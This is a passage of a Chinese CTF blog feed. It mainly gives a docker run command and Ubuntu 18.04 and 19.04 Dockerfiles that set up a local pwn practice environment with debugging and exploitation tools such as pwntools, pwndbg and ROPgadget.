class="headerlink" title="参考"></a>参考</h2><p><a href="https://cloud.tencent.com/developer/article/1608151">高校战“疫”网络安全分享赛-部分PWN题-wp</a></p><p><a href="https://www.anquanke.com/post/id/200878">从高校战疫的两道kernel学习kernel</a></p><p><a href="https://bbs.pediy.com/thread-253868.htm">Unicorn 在 Android 的应用</a></p><p><a href="http://b0ldfrev.top/2020/03/10/easy_unicorn/">easy_unicorn基于unicorn的“沙盒逃逸”</a></p><p><a href="https://bbs.pediy.com/thread-259138.htm">unicorn沙箱下的pwn</a></p><p><a href="https://blog.team-su.com/passages/2020-03-10-gxzyCTF/">高校战“疫”网络安全分享赛 2020 SU Write Up</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>docker pwn 环境搭建</title>
      <link href="/posts/2727069109.html"/>
      <url>/posts/2727069109.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run -it -v /home/pwn/Desktop/pwn_ques:/root/work -v /home/pwn/Desktop/glibc:/root/glibc -p 9994:8888 --privileged --cap-add=SYS_PTRACE --security-opt=<span class="string">&quot;seccomp=unconfined&quot;</span> --name pwn18_10 pwn:18.10</span><br></pre></td></tr></table></figure><h2 id="ubuntu-18-04-pwn-docker-dockerfile"><a href="#ubuntu-18-04-pwn-docker-dockerfile" class="headerlink" title="ubuntu 18.04 pwn docker dockerfile"></a>ubuntu 18.04 pwn docker dockerfile</h2><p>目前是<code>18.04</code>的<code>Dockerfile</code></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">18.04</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> TZ Asia/Shanghai</span><br><span class="line"><span class="keyword">ENV</span> DEBIAN_FRONTEND noninteractive</span><br><span class="line"><span class="keyword">ENV</span> LANG C.UTF-<span class="number">8</span></span><br><span class="line"><span class="comment"># ENV HTTP_PROXY &quot;socks5://192.168.0.6:10080&quot;</span></span><br><span class="line"><span class="comment"># ENV HTTPS_PROXY &quot;socks5://192.168.0.6:10080&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i <span class="string">&#x27;s/\(archive\|security\).ubuntu.com/mirrors.tuna.tsinghua.edu.cn/&#x27;</span> /etc/apt/sources.list</span></span><br><span class="line"><span class="comment"># RUN apt-get -y update &amp;&amp; apt-get install -y --no-install-recommends apt-utils</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> dpkg --add-architecture i386 &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get -y update &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get install -y --no-install-recommends apt-utils &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt install -y \</span></span><br><span class="line"><span class="language-bash">    libc6:i386 \</span></span><br><span class="line"><span class="language-bash">    libc6-dbg:i386 \</span></span><br><span class="line"><span class="language-bash">    libc6-dbg \</span></span><br><span class="line"><span class="language-bash">    lib32stdc++6 \</span></span><br><span class="line"><span class="language-bash">    g++-multilib \</span></span><br><span class="line"><span class="language-bash">    cmake \</span></span><br><span class="line"><span class="language-bash">    ipython3 \</span></span><br><span class="line"><span class="language-bash">    vim \</span></span><br><span class="line"><span class="language-bash">    net-tools \</span></span><br><span class="line"><span class="language-bash">    iputils-ping \</span></span><br><span class="line"><span class="language-bash">    libffi-dev \</span></span><br><span class="line"><span class="language-bash">    libssl-dev \</span></span><br><span class="line"><span class="language-bash">    python3-dev \</span></span><br><span class="line"><span class="language-bash">    python3-pip \</span></span><br><span class="line"><span class="language-bash">    build-essential \</span></span><br><span class="line"><span class="language-bash">    ruby \</span></span><br><span class="line"><span class="language-bash">    ruby-dev \</span></span><br><span class="line"><span class="language-bash">    tmux \</span></span><br><span class="line"><span class="language-bash">    strace \</span></span><br><span class="line"><span class="language-bash">    ltrace \</span></span><br><span class="line"><span class="language-bash">    nasm \</span></span><br><span class="line"><span class="language-bash">    wget \</span></span><br><span class="line"><span class="language-bash">    gdb \</span></span><br><span class="line"><span class="language-bash">    gdb-multiarch \</span></span><br><span class="line"><span class="language-bash">    netcat \</span></span><br><span class="line"><span class="language-bash">    socat \</span></span><br><span class="line"><span class="language-bash">    git \</span></span><br><span class="line"><span class="language-bash">    patchelf \</span></span><br><span class="line"><span class="language-bash">    gawk \</span></span><br><span class="line"><span class="language-bash">    file \</span></span><br><span class="line"><span class="language-bash">    python3-distutils \</span></span><br><span class="line"><span class="language-bash">    tzdata \</span></span><br><span class="line"><span class="language-bash">    bison</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">rm</span> -rf /var/lib/apt/list/*</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">ln</span> -fs /usr/share/zoneinfo/<span class="variable">$TZ</span> /etc/localtime &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    dpkg-reconfigure -f noninteractive tzdata</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> wget https://github.com/radareorg/radare2/releases/download/4.4.0/radare2_4.4.0_amd64.deb &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    dpkg -i radare2_4.4.0_amd64.deb &amp;&amp; <span class="built_in">rm</span> radare2_4.4.0_amd64.deb</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> python3 -m pip install -i https://pypi.tuna.tsinghua.edu.cn/simple -U pip &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    python3 -m pip config <span class="built_in">set</span> global.index-url http://mirrors.aliyun.com/pypi/simple &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    python3 -m pip config <span class="built_in">set</span> install.trusted-host mirrors.aliyun.com &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    python3 -m pip install --no-cache-dir --use-feature=2020-resolver\</span></span><br><span class="line"><span class="language-bash">    ropgadget \</span></span><br><span class="line"><span class="language-bash">    pwntools \</span></span><br><span class="line"><span class="language-bash">    z3-solver \</span></span><br><span class="line"><span class="language-bash">    smmap2 \</span></span><br><span class="line"><span class="language-bash">    apscheduler \</span></span><br><span class="line"><span class="language-bash">    ropper \</span></span><br><span class="line"><span class="language-bash">    unicorn \</span></span><br><span class="line"><span class="language-bash">    keystone-engine \</span></span><br><span class="line"><span class="language-bash">    capstone \</span></span><br><span class="line"><span class="language-bash">    angr \</span></span><br><span class="line"><span class="language-bash">    pebble \</span></span><br><span class="line"><span class="language-bash">    r2pipe \</span></span><br><span class="line"><span class="language-bash">    filebytes \</span></span><br><span class="line"><span class="language-bash">    keystone-engine</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> python3 -m pip install setuptools --upgrade --no-cache-dir</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> python3 -m pip install ropper --no-cache-dir</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> gem install one_gadget seccomp-tools &amp;&amp; <span class="built_in">rm</span> -rf /var/lib/gems/2.*/cache/*</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /root/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> pwndbg /root/pwndbg</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> Pwngdb /root/Pwngdb</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">pwd</span></span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">ls</span></span></span><br><span class="line"><span class="comment"># RUN git clone --depth 1 https://github.com/pwndbg/pwndbg &amp;&amp; \</span></span><br><span class="line"><span class="comment">#    cd pwndbg &amp;&amp; chmod +x setup.sh &amp;&amp; ./setup.sh</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">cd</span> /root/pwndbg &amp;&amp; <span class="built_in">chmod</span> +x setup.sh &amp;&amp; ./setup.sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#RUN git clone --depth 1 https://github.com/scwuaptx/Pwngdb.git /root/Pwngdb &amp;&amp; \</span></span><br><span class="line"><span class="comment">#    cd /root/Pwngdb &amp;&amp; cat /root/Pwngdb/.gdbinit  &gt;&gt; /root/.gdbinit</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">cd</span> /root/Pwngdb &amp;&amp; <span class="built_in">cat</span> /root/Pwngdb/.gdbinit  &gt;&gt; /root/.gdbinit</span></span><br><span class="line"><span class="comment"># &amp;&amp; \</span></span><br><span class="line"><span class="comment">#    sed -i &quot;s?source ~/peda/peda.py?# source ~/peda/peda.py?g&quot; /root/.gdbinit</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i <span class="string">&quot;s?source ~/peda/peda.py?# source ~/peda/peda.py?g&quot;</span> /root/.gdbinit</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#RUN git clone --depth 1 https://github.com/niklasb/libc-database.git libc-database &amp;&amp; \</span></span><br><span class="line"><span class="comment">#    cd libc-database &amp;&amp; ./get || echo &quot;/libc-database/&quot; &gt; ~/.libcdb_path</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">touch</span> /root/.tmux.conf &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">echo</span> <span class="string">&quot;set -g history-limit 5000&quot;</span> &gt;&gt; /root/.tmux.conf &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">echo</span> <span class="string">&quot;set -g mouse on&quot;</span> &gt;&gt; /root/.tmux.conf</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> update-alternatives --install /usr/bin/python python /usr/bin/python3 100 --slave /usr/bin/pip pip /usr/bin/pip3 &amp;&amp;\</span></span><br><span class="line"><span class="language-bash">    update-alternatives --install /usr/bin/python python /usr/bin/python2 90 --slave /usr/bin/pip pip /usr/bin/pip2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> ~/work</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /root/work</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">9999</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;tmux&quot;</span>]</span></span><br></pre></td></tr></table></figure><h2 id="ubuntu-19-04-pwn-docker-dockerfile"><a href="#ubuntu-19-04-pwn-docker-dockerfile" class="headerlink" title="ubuntu 19.04 pwn docker dockerfile"></a>ubuntu 19.04 pwn docker dockerfile</h2><p><code>ubuntu 19.04</code> 的<code>dockerfile</code>，主要是将源中网址添加<code>old-release</code>，并只设置<code>main restricted</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">deb http://old-releases.ubuntu.com/ubuntu disco main restricted</span><br><span class="line">deb-src http://old-releases.ubuntu.com/ubuntu disco main restricted</span><br><span class="line">deb http://old-releases.ubuntu.com/ubuntu disco-updates main restricted</span><br><span class="line">deb-src http://old-releases.ubuntu.com/ubuntu disco-updates main restricted</span><br><span class="line">deb http://old-releases.ubuntu.com/ubuntu disco-security main restricted</span><br><span class="line">deb-src http://old-releases.ubuntu.com/ubuntu disco-security main restricted</span><br></pre></td></tr></table></figure><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">19.04</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> TZ Asia/Shanghai</span><br><span class="line"><span class="keyword">ENV</span> DEBIAN_FRONTEND noninteractive</span><br><span class="line"><span class="comment"># ENV HTTP_PROXY &quot;socks5://192.168.0.6:10080&quot;</span></span><br><span class="line"><span class="comment"># ENV HTTPS_PROXY &quot;socks5://192.168.0.6:10080&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">rm</span> /etc/apt/sources.list</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ubuntu_19_04_sources.list /etc/apt/sources.list</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># RUN sed -i &#x27;s/\(archive\|security\).ubuntu.com/mirrors.aliyun.com/&#x27; /etc/apt/sources.list</span></span><br><span class="line"><span class="comment"># RUN cat /etc/apt/sources.list</span></span><br><span class="line"><span class="comment"># RUN sed -i &#x27;s/archive.ubuntu.com/old-released.archive.ubuntu.com/&#x27; /etc/apt/sources.list</span></span><br><span class="line"><span class="comment"># RUN sed -i &#x27;s/security.ubuntu.com/old-released.security.ubuntu.com/&#x27; /etc/apt/sources.list</span></span><br><span class="line"><span class="comment"># RUN sed -i &#x27;s/# deb-src/deb-src/&#x27; /etc/apt/sources.list</span></span><br><span class="line"><span class="comment"># RUN apt-get -y update &amp;&amp; apt-get install -y --no-install-recommends apt-utils</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> dpkg --add-architecture i386 &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get -y update &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get -y install software-properties-common &amp;&amp;\</span></span><br><span class="line"><span class="language-bash"><span class="comment">#    apt-add-repository universe &amp;&amp; \</span></span></span><br><span class="line"><span class="language-bash">    apt-get install -y --no-install-recommends apt-utils &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt install -y \</span></span><br><span class="line"><span class="language-bash">    libc6:i386 \</span></span><br><span class="line"><span class="language-bash">    libc6-dbg:i386 \</span></span><br><span class="line"><span class="language-bash">    libc6-dbg \</span></span><br><span class="line"><span class="language-bash">    lib32stdc++6 \</span></span><br><span class="line"><span class="language-bash">    g++-multilib \</span></span><br><span class="line"><span class="language-bash">    cmake \</span></span><br><span class="line"><span class="language-bash"><span class="comment">#    ipython3 \</span></span></span><br><span class="line"><span class="language-bash">    vim \</span></span><br><span class="line"><span class="language-bash">    net-tools \</span></span><br><span class="line"><span class="language-bash">    iputils-ping \</span></span><br><span class="line"><span class="language-bash">    libffi-dev \</span></span><br><span class="line"><span class="language-bash">    libssl-dev \</span></span><br><span class="line"><span class="language-bash">    python3-dev \</span></span><br><span class="line"><span class="language-bash"><span class="comment">#     python3-pip \</span></span></span><br><span class="line"><span class="language-bash">    build-essential \</span></span><br><span class="line"><span class="language-bash">    ruby \</span></span><br><span class="line"><span class="language-bash">    ruby-dev \</span></span><br><span class="line"><span class="language-bash">    tmux \</span></span><br><span class="line"><span class="language-bash">    strace \</span></span><br><span class="line"><span class="language-bash">    ltrace \</span></span><br><span class="line"><span class="language-bash"><span class="comment">#     nasm \</span></span></span><br><span class="line"><span class="language-bash">    wget \</span></span><br><span class="line"><span class="language-bash">    gdb \</span></span><br><span class="line"><span class="language-bash"><span class="comment">#     gdb-multiarch \</span></span></span><br><span class="line"><span class="language-bash">    netcat \</span></span><br><span class="line"><span class="language-bash">    socat \</span></span><br><span class="line"><span class="language-bash">    git \</span></span><br><span class="line"><span class="language-bash"><span class="comment">#    patchelf \</span></span></span><br><span class="line"><span class="language-bash">    gawk \</span></span><br><span class="line"><span class="language-bash">    file \</span></span><br><span class="line"><span class="language-bash"><span class="comment">#    python3-distutils \</span></span></span><br><span class="line"><span class="language-bash">    tzdata \</span></span><br><span class="line"><span class="language-bash">    bison</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> get-pip.py /</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> python3 get-pip.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">rm</span> -rf /var/lib/apt/list/*</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">ln</span> -fs /usr/share/zoneinfo/<span class="variable">$TZ</span> /etc/localtime &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    dpkg-reconfigure -f noninteractive tzdata</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> wget https://github.com/radareorg/radare2/releases/download/4.4.0/radare2_4.4.0_amd64.deb &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    dpkg -i radare2_4.4.0_amd64.deb &amp;&amp; <span class="built_in">rm</span> radare2_4.4.0_amd64.deb</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> python3 -m pip install -i https://pypi.tuna.tsinghua.edu.cn/simple -U pip &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    python3 -m pip config <span class="built_in">set</span> global.index-url http://mirrors.aliyun.com/pypi/simple &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    python3 -m pip config <span class="built_in">set</span> install.trusted-host mirrors.aliyun.com &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    python3 -m pip install setuptools --upgrade --no-cache-dir &amp;&amp;\</span></span><br><span class="line"><span class="language-bash">    python3 -m pip install --no-cache-dir --use-feature=2020-resolver\</span></span><br><span class="line"><span class="language-bash">    ropgadget \</span></span><br><span class="line"><span class="language-bash">    pwntools \</span></span><br><span class="line"><span class="language-bash">    z3-solver \</span></span><br><span class="line"><span class="language-bash">    smmap2 \</span></span><br><span class="line"><span class="language-bash">    apscheduler \</span></span><br><span class="line"><span class="language-bash">    ropper \</span></span><br><span class="line"><span class="language-bash">    unicorn \</span></span><br><span class="line"><span class="language-bash">    keystone-engine \</span></span><br><span class="line"><span class="language-bash">    capstone \</span></span><br><span class="line"><span class="language-bash">    angr \</span></span><br><span class="line"><span class="language-bash">    pebble \</span></span><br><span class="line"><span class="language-bash"><span class="comment">#    r2pipe \</span></span></span><br><span class="line"><span class="language-bash">    filebytes \</span></span><br><span class="line"><span class="language-bash">    keystone-engine \</span></span><br><span class="line"><span class="language-bash">    ropper</span></span><br><span class="line"><span class="comment">#python3 -m pip install ropper --no-cache-dir</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># RUN gem install one_gadget seccomp-tools &amp;&amp; rm -rf /var/lib/gems/2.*/cache/*</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> gem install one_gadget &amp;&amp; <span class="built_in">rm</span> -rf /var/lib/gems/2.*/cache/*</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pip3 -V</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /root/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> pwndbg /root/pwndbg</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> Pwngdb /root/Pwngdb</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">pwd</span></span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">ls</span></span></span><br><span class="line"><span class="comment"># RUN git clone --depth 1 https://github.com/pwndbg/pwndbg &amp;&amp; \</span></span><br><span class="line"><span class="comment">#    cd pwndbg &amp;&amp; chmod +x setup.sh &amp;&amp; ./setup.sh</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">cd</span> /root/pwndbg &amp;&amp; <span class="built_in">chmod</span> +x setup.sh &amp;&amp; ./setup.sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#RUN git clone --depth 1 https://github.com/scwuaptx/Pwngdb.git /root/Pwngdb &amp;&amp; \</span></span><br><span class="line"><span class="comment">#    cd /root/Pwngdb &amp;&amp; cat /root/Pwngdb/.gdbinit  &gt;&gt; /root/.gdbinit</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">cd</span> /root/Pwngdb &amp;&amp; <span class="built_in">cat</span> /root/Pwngdb/.gdbinit  &gt;&gt; /root/.gdbinit</span></span><br><span class="line"><span class="comment"># &amp;&amp; \</span></span><br><span class="line"><span class="comment">#    sed -i &quot;s?source ~/peda/peda.py?# source ~/peda/peda.py?g&quot; /root/.gdbinit</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#RUN git clone --depth 1 https://github.com/niklasb/libc-database.git libc-database &amp;&amp; \</span></span><br><span class="line"><span class="comment">#    cd libc-database &amp;&amp; ./get || echo &quot;/libc-database/&quot; &gt; ~/.libcdb_path</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> LANG C.UTF-<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">touch</span> /root/.tmux.conf &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">echo</span> <span class="string">&quot;set -g history-limit 5000&quot;</span> &gt;&gt; /root/.tmux.conf &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">echo</span> <span class="string">&quot;set -g mouse on&quot;</span> &gt;&gt; /root/.tmux.conf</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> update-alternatives --install /usr/bin/python python /usr/bin/python3 100 --slave /usr/bin/pip pip /usr/bin/pip3 &amp;&amp;\</span></span><br><span class="line"><span class="language-bash">    update-alternatives --install /usr/bin/python python /usr/bin/python2 90 --slave /usr/bin/pip pip /usr/bin/pip2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i <span class="string">&quot;s?source ~/peda/peda.py?# source ~/peda/peda.py?g&quot;</span> /root/.gdbinit</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> ~/work</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /root/work</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">9999</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;tmux&quot;</span>]</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN总结 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>GeekPwn 2020 云靶场挑战赛热身赛 WP</title>
      <link href="/posts/1951095530.html"/>
      <url>/posts/1951095530.html</url>
      
